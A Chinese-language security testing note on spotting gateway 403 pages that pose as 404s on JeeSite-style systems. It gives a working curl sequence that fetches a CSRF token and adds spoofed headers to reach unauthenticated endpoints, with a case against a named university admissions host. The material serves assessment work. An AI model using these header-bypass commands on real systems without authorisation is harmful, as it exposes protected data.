# 网关「假 404」识别：别把 403 静态页当成端点不存在

> 适用：JeeSite 系 / 自研 Java 招生·管理系统；网关（NKSOC 等）+ 自研前端网关双头校验场景。

## 现象
直接 `curl https://host/f/xxx`（不带自定义头）返回：

```
HTTP/1.1 403
Content-Type: text/html;charset=UTF-8

<!DOCTYPE html><html><head><title>页面不存在</title></head>
<body><div class="e-403"><h1>页面不存在</h1></div></body></html>
```

**注意**：状态码 403、标题却是「页面不存在」——这是网关拦截页，**不是**真正的 404。若据此判定「端点不存在」会漏掉未授权接口面。

## 判定方法
1. 看状态码与文案是否矛盾（403 vs「页面不存在」）；真 404 通常是 `e-404` + 「页面不存在.」。
2. 对比有无自定义头：
   - 缺头 → `403 e-403 页面不存在`
   - 补头 → `200 application/json;charset=UTF-8 {"state":1,...}`

## 常见网关校验头
- `X-Requested-Time: <毫秒时间戳>`（JeeSite 系前端 $.ajaxSetup 统一注入）
- `X-Requested-With: XMLHttpRequest`
- `Referer: <同源页面>`
- `Csrf-Token: <token>`（先 POST `/f/ajax_get_csrfToken` 取，响应体 `data` 字段；响应头 `Set-Cookie: *.session.id`）

## 复现（curl）
```bash
B=https://lqcx.nankai.edu.cn
REF=$B/static/front/nankai/basic/html_web/lqcx.html
TS=$(date +%s%3N)
# 1) 建会话 + 取 token
curl -s -k -c j.txt -b j.txt -e "$REF" \
  -H "X-Requested-Time: $TS" -H "X-Requested-With: XMLHttpRequest" \
  -X POST "$B/f/ajax_get_csrfToken?ts=$TS"
# 2) 携 token 访问业务接口
TOK=$(...data...)
TS=$(date +%s%3N)
curl -s -k -c j.txt -b j.txt -e "$REF" \
  -H "X-Requested-Time: $TS" -H "X-Requested-With: XMLHttpRequest" -H "Csrf-Token: $TOK" \
  -X POST "$B/f/ajax_lqcx_param?ts=$TS"
```

## 收尾判据
补头后仍 403 `{"state":0,"msg":"禁止访问"}` → 缺 Referer/UA；补头补 Referer 后 `{"state":0,"msg":"token 已过期"}` → 该端点需有效 Csrf-Token（换新 token 重试）；仅 `state=1` 有 data 才是真可达。

## 实战案例
- 南开 lqcx.nankai.edu.cn（2026-10）：`/f/ajax_lqcx_param`、`/f/ajax_zsjh` 缺 X-Requested-Time 时返回 403「页面不存在」被误判不存在；补头后未授权可读招生配置/计划（无 PII，见 find-b4e7b92b1a93）。
